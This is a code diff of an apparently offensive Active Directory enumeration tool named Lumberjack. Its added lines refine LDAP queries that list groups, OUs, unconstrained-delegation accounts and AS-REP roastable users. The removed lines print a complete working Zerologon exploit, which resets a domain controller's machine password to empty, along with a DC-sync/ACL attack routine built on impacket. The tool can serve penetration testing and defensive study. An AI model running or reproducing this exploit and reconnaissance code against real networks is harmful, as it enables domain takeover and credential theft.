@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 try:
 	#module imports
-	import argparse, re, sys, textwrap, socket, random, threading, json, os
+	import argparse, re, sys, textwrap, socket, random, threading, json, os, ldapdomaindump
 
 	#other imports
 	from datetime import datetime, timedelta
@@ -22,7 +22,6 @@ try:
 	from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 	from impacket.dcerpc.v5 import nrpc, epm
 	from impacket.smbconnection import SessionError
-	import ldapdomaindump
 	from netaddr import *
 	from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
 	from impacket.ntlm import compute_lmhash, compute_nthash
@@ -224,13 +223,19 @@ class EnumerateAD(object):
 	#Enumerate Active Directory Groups			
 	def enumerateGroups(self):
 		
+		groupobj = []
 		try:
 			self.status.update("[bold white]Finding Active Directory Groups...")
 			sleep(1)
 			console.rule("[bold red]Domain Groups")
 			#Search AD Group
-			self.conn.search(self.dc_search[:-1], search_filter='(objectCategory=group)', size_limit=0)
-			pprint(self.conn.entries)
+			self.conn.search(self.dc_search[:-1], search_filter='(objectCategory=group)', attributes=['distinguishedName', 'cn'], size_limit=0)
+			for entry in self.conn.entries:
+				name = entry["distinguishedName"][0]
+				groupobj.append({
+					"Group": name,
+				})
+			pprint (groupobj)
 			console.print ("[+] Success: Got all groups ", style = "success")
 			print('')
 			console.print('[-] Found {0} groups'.format(len(self.conn.entries)), style = "info")
@@ -251,13 +256,19 @@ class EnumerateAD(object):
 	#Enumerate Organisational Units
 	def enumerateOUs(self):
 		
+		ouObj = []
 		try:
 			self.status.update("[bold white]Finding Organisational Units...")
 			sleep(1)
 			console.rule("[bold red]Organisational Units")
 			#Search AD Organisational Units
-			self.conn.search(self.dc_search[:-1], search_filter='(objectclass=organizationalUnit)', size_limit=0)
-			pprint(self.conn.entries)
+			self.conn.search(self.dc_search[:-1], search_filter='(objectclass=organizationalUnit)', attributes=['distinguishedName'], size_limit=0)
+			for entry in self.conn.entries:
+				name = entry["distinguishedName"][0]
+				ouObj.append({
+					"OU": name,
+				})
+			pprint (ouObj)
 			console.print ("[+] Success: Got all OUs ", style = "success")
 			print('')
 			console.print('[-] Found {0} OUs'.format(len(self.conn.entries)), style = "info")
@@ -313,14 +324,20 @@ class EnumerateAD(object):
 			
 	#Enumerate accounts trusted for delegation (unconstrained delegation)					
 	def unconstrainedDelegation(self):
-		
+		unconstrained = []
 		try:	
 			self.status.update("[bold white]Finding Users with unconstrained delegation...")
 			sleep(1)
 			console.rule("[bold red]Unconstrained Delegation")
-			self.conn.search(self.dc_search[:-1], search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', size_limit=0)
-			pprint(self.conn.entries)  
+			self.conn.search(self.dc_search[:-1], search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', attributes=["sAMAccountName"],  size_limit=0)
+			for entry in self.conn.entries:
+				name = entry["sAMAccountName"][0]
+				unconstrained.append({
+					"Unconstrained Users": name,
+				})
+			pprint (unconstrained)
 			if len(self.conn.entries) >= 1:
+				print('')
 				console.print ("[!] Vulnerability: Domain Vulnerable to unconstrained delegation", style = "error")
 				print('')
 			console.print('[-] Found {0} account(s) with unconstrained delegation'.format(len(self.conn.entries)), style = "info")
@@ -371,14 +388,21 @@ class EnumerateAD(object):
 			console.print ("[-] Warning: Aborted", style = "warning")
 
 	def enumKerbPreAuth(self):
+		
+		asRepObj = []
 		self.status.update("[bold white]Finding Users that dont require Kerberos Pre-Authentication...")
 		# Build user array
 		users = []
 		console.rule("[bold red]AS-REP Roastable Users")
-		self.conn.search(self.dc_search[:-1], search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes=ALL_ATTRIBUTES,search_scope=SUBTREE)
+		self.conn.search(self.dc_search[:-1], search_filter='(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', 
+				attributes=["cn", "objectSid", "sAMAccountName"], search_scope=SUBTREE)
 		for entry in self.conn.entries:
+			name = entry["sAMAccountName"][0]
+			asRepObj.append({
+				"AS-REP Roastable Users": name,
+			})
+			pprint (asRepObj)
 			users.append(str(entry['sAMAccountName']) + '@{0}'.format(self.dc))
-		pprint(self.conn.entries)
 		if len(self.conn.entries) >= 1:
 			console.print ("[!] Vulnerability: Domain users vulnerable to AS-REP Roasting", style = "error")
 			print('')
@@ -533,116 +557,7 @@ class EnumerateAD(object):
 		    with open('{0}-open-smb.json'.format(self.dc), 'w') as f:
 		        json.dump(self.smbBrowseable, f, indent=4, sort_keys=False)
 		    print('[ ' + colored('OK', 'green') + ' ] Wrote browseable shares to {0}-open-smb.json'.format(self.dc))
-
-	def dcSync(self):
-
-		c = NTLMRelayxConfig()
-		c.addcomputer = 'idk lol'
-		c.target = self.dc
-
-		console.print ("[-] Starting DC-Sync Attack on {}".format(self.dUser), style="status")
-		console.print ("[-] Initialising LDAP connection to {}".format(self.dc), style="status")
 		
-		console.print ("[-] Initialising domainDumper()", style="status")
-		cnf = ldapdomaindump.domainDumpConfig()
-		cnf.basepath = c.lootdir
-		dd = ldapdomaindump.domainDumper(self.server, self.conn, cnf)
-		
-		console.print ("[-] Initializing LDAPAttack()", style="status")
-		la = LDAPAttack(c, self.conn)
-		la.aclAttack(self.dc, dd)	    
-
-class zeroLogon(object):
-	
-	def err(msg):
-		cprint("[!] " + msg, "red")
-
-	def try_zero_authenticate(dc_handle, dc_ip, target_computer):
-		# Connect to the DC's Netlogon service.
-		binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
-		rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
-		rpc_con.connect()
-		rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
-
-		# Use an all-zero challenge and credential.
-		plaintext = b"\x00" * 8
-		ciphertext = b"\x00" * 8
-
-		# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
-		flags = 0x212fffff
-
-		# Send challenge and authentication request.
-		nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + "\x00", target_computer + "\x00", plaintext)
-		try:
-			server_auth = nrpc.hNetrServerAuthenticate3(
-				rpc_con, dc_handle + "\x00", target_computer + "$\x00",
-				nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
-						target_computer + "\x00", ciphertext, flags
-			)
-
-			# It worked!
-			assert server_auth["ErrorCode"] == 0
-			return rpc_con
-
-		except nrpc.DCERPCSessionError as ex:
-			# Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
-			if ex.get_error_code() == 0xc0000022:
-				return None
-			else:
-				err("Unexpected error code returned from DC: {}".format(ex.get_error_code()))
-		except BaseException as ex:
-			err("Unexpected error: {}".format(ex))
-
-	def try_zerologon(dc_handle, rpc_con, target_computer):
-		
-		request = nrpc.NetrServerPasswordSet2()
-		request["PrimaryName"] = dc_handle + "\x00"
-		request["AccountName"] = target_computer + "$\x00"
-		request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
-		authenticator = nrpc.NETLOGON_AUTHENTICATOR()
-		authenticator["Credential"] = b"\x00" * 8
-		authenticator["Timestamp"] = 0
-		request["Authenticator"] = authenticator
-		request["ComputerName"] = target_computer + "\x00"
-		request["ClearNewPassword"] = b"\x00" * 516
-		return rpc_con.request(request)
-
-	def perform_attack(dc_handle, dc_ip, target_computer):
-		banner = pyfiglet.figlet_format("Zerologon", "slant")
-		cprint(banner, "green")
-		cprint("Checker & Exploit by VoidSec\n", "white")
-		# Keep authenticating until successful. Expected average number of attempts needed: 256.
-		cprint("Performing authentication attempts...", "white")
-		rpc_con = None
-		for attempt in range(0, MAX_ATTEMPTS):
-			rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
-
-			if rpc_con is None:
-				cprint(".", "magenta", end="", flush=True)
-			else:
-				break
-
-		if rpc_con:
-			cprint("\n[+] Success: Target is vulnerable!", "green")
-			cprint("[-] Do you want to continue and exploit the Zerologon vulnerability? [N]/y", "yellow")
-			exec_exploit = input().lower()
-			if exec_exploit == "y":
-				result = try_zerologon(dc_handle, rpc_con, target_computer)
-				if result["ErrorCode"] == 0:
-					cprint(
-						"[+] Success: Zerologon Exploit completed! DC's account password has been set to an empty string.",
-						"green")
-				else:
-					err(
-						"Exploit Failed: Non-zero return code, something went wrong. Domain Controller returned: {}".format(
-							result["ErrorCode"]))
-			else:
-				err("Aborted")
-				sys.exit(0)
-		else:
-			err("Exploit failed: target DC is probably patched.")
-			sys.exit(1)
-
 def titleArt():
 	f = Figlet(font="slant")
 	cprint(colored(f.renderText('Lumberjack'), 'cyan'))
@@ -738,7 +653,6 @@ def main():
 	#Run main features
 	try:
 		enumAD = EnumerateAD(args.dc, args.ldaps, args.ldap, args.verbose, args.ip_address, args.connect, args.smb, args.krb, args.fuzz, status, args.username, password)
-		#zeroLogon = zerologonExploit(args.netbios, args.ip_address, status)
 		enumAD.connect()
 		if not pwdres:
 			print('')
